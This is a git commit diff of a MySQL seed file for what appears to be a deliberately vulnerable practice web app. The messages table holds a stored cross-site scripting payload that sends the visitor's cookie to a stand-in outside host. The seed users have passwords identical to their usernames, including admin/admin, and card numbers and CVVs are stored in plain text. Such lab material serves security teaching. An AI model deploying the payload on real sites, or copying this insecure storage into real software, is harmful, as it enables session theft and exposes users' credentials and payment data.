a3ff54daddd49278c57eeddc703960dcc6643d70
Radha Krishna <radhakrishna@srijancapital.com>
2018-10-09 17:38:15 +0530

    Committed updated db.sql file

--- db.sql
+++ db.sql
@@ -1,62 +1,37 @@
---
--- Table structure for table `invoices`
---
+-- Adminer 4.6.1 MySQL dump
+
+SET NAMES utf8;
+SET time_zone = '+00:00';
+SET foreign_key_checks = 0;
+SET sql_mode = 'NO_AUTO_VALUE_ON_ZERO';
 
 DROP TABLE IF EXISTS `invoices`;
-/*!40101 SET @saved_cs_client     = @@character_set_client */;
-/*!40101 SET character_set_client = utf8 */;
 CREATE TABLE `invoices` (
   `id` int(11) NOT NULL AUTO_INCREMENT,
   `user` varchar(128) DEFAULT NULL,
   `amount_cents` int(11) DEFAULT NULL,
   `product` varchar(50) DEFAULT NULL,
   PRIMARY KEY (`id`)
-) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
-/*!40101 SET character_set_client = @saved_cs_client */;
+) ENGINE=MyISAM DEFAULT CHARSET=latin1;
 
---
--- Dumping data for table `invoices`
---
-
-LOCK TABLES `invoices` WRITE;
-/*!40000 ALTER TABLE `invoices` DISABLE KEYS */;
-INSERT INTO `invoices` VALUES (1,'1',2,'test');
-/*!40000 ALTER TABLE `invoices` ENABLE KEYS */;
-UNLOCK TABLES;
-
---
--- Table structure for table `messages`
---
+INSERT INTO `invoices` (`id`, `user`, `amount_cents`, `product`) VALUES
+(1,	'1',	2,	'test');
 
 DROP TABLE IF EXISTS `messages`;
-/*!40101 SET @saved_cs_client     = @@character_set_client */;
-/*!40101 SET character_set_client = utf8 */;
 CREATE TABLE `messages` (
   `id` int(11) NOT NULL AUTO_INCREMENT,
   `user_id` int(11) DEFAULT NULL,
   `subject` varchar(255) DEFAULT NULL,
   `message` text,
   PRIMARY KEY (`id`)
-) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
-/*!40101 SET character_set_client = @saved_cs_client */;
+) ENGINE=MyISAM DEFAULT CHARSET=latin1;
 
---
--- Dumping data for table `messages`
---
-
-LOCK TABLES `messages` WRITE;
-/*!40000 ALTER TABLE `messages` DISABLE KEYS */;
-INSERT INTO `messages` VALUES (1,1,'Hello There','Hey Jared, Really loved your talk.\r\n\r\n<script>\r\nnew Image().src=\"http://arandomwebsitethatisbadandstuff.com/?c=\"+encodeURI(document.cookie);\r\n</script>');
-/*!40000 ALTER TABLE `messages` ENABLE KEYS */;
-UNLOCK TABLES;
-
---
--- Table structure for table `payment_details`
---
+INSERT INTO `messages` (`id`, `user_id`, `subject`, `message`) VALUES
+(1,	1,	'Hello There',	'Hey Jared, Really loved your talk.\r\n\r\n<script>\r\nnew Image().src=\"http://arandomwebsitethatisbadandstuff.com/?c=\"+encodeURI(document.cookie);\r\n</script>'),
+(2,	1,	'hi',	'how are Jared'),
+(3,	2,	'hi allan',	'Hope you are fine allan!');
 
 DROP TABLE IF EXISTS `payment_details`;
-/*!40101 SET @saved_cs_client     = @@character_set_client */;
-/*!40101 SET character_set_client = utf8 */;
 CREATE TABLE `payment_details` (
   `id` int(11) NOT NULL AUTO_INCREMENT,
   `user_id` int(11) DEFAULT NULL,
@@ -66,26 +41,13 @@ CREATE TABLE `payment_details` (
   `expire_month` int(11) DEFAULT NULL,
   `expire_year` int(11) DEFAULT NULL,
   PRIMARY KEY (`id`)
-) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=latin1;
-/*!40101 SET character_set_client = @saved_cs_client */;
+) ENGINE=MyISAM DEFAULT CHARSET=latin1;
 
---
--- Dumping data for table `payment_details`
---
-
-LOCK TABLES `payment_details` WRITE;
-/*!40000 ALTER TABLE `payment_details` DISABLE KEYS */;
-INSERT INTO `payment_details` VALUES (1,1,'4564123412341234',123,'Jared Mooring',5,2011),(2,2,'4564123412341234',123,'Allan Shone',5,2011);
-/*!40000 ALTER TABLE `payment_details` ENABLE KEYS */;
-UNLOCK TABLES;
-
---
--- Table structure for table `users`
---
+INSERT INTO `payment_details` (`id`, `user_id`, `card_number`, `ccv`, `name`, `expire_month`, `expire_year`) VALUES
+(1,	1,	'4564123412341234',	123,	'Jared Mooring',	5,	2011),
+(2,	2,	'4564123412341234',	123,	'Allan Shone',	5,	2011);
 
 DROP TABLE IF EXISTS `users`;
-/*!40101 SET @saved_cs_client     = @@character_set_client */;
-/*!40101 SET character_set_client = utf8 */;
 CREATE TABLE `users` (
   `id` int(11) NOT NULL AUTO_INCREMENT,
   `username` varchar(20) DEFAULT NULL,
@@ -93,27 +55,13 @@ CREATE TABLE `users` (
   `firstname` varchar(20) DEFAULT NULL,
   `surname` varchar(20) DEFAULT NULL,
   `email` varchar(255) DEFAULT NULL,
+  `role` enum('user','admin') DEFAULT 'user',
   PRIMARY KEY (`id`)
-) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=latin1;
-/*!40101 SET character_set_client = @saved_cs_client */;
+) ENGINE=MyISAM DEFAULT CHARSET=latin1;
 
---
--- Dumping data for table `users`
---
+INSERT INTO `users` (`id`, `username`, `password`, `firstname`, `surname`, `email`, `role`) VALUES
+(1,	'jared',	'jared',	'Jared',	'Mooring',	'jared@test.com',	'user'),
+(2,	'allan',	'allan',	'Allan1',	'Shone1',	'allan@test.com',	'user'),
+(3,	'admin',	'admin',	'rk',	'sarma',	'radhakrishna@srijancapital.com',	'admin');
 
-LOCK TABLES `users` WRITE;
-/*!40000 ALTER TABLE `users` DISABLE KEYS */;
-INSERT INTO `users` VALUES (1,'jared','jared','Jared','Mooring','jared@test.com'),(2,'allan','allan','Allan','Shone','allan@test.com');
-/*!40000 ALTER TABLE `users` ENABLE KEYS */;
-UNLOCK TABLES;
-/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;
-
-/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
-/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
-/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
-/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
-/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
-/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
-/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
-
--- Dump completed on 2010-12-22  0:40:48
+-- 2018-10-09 12:05:31
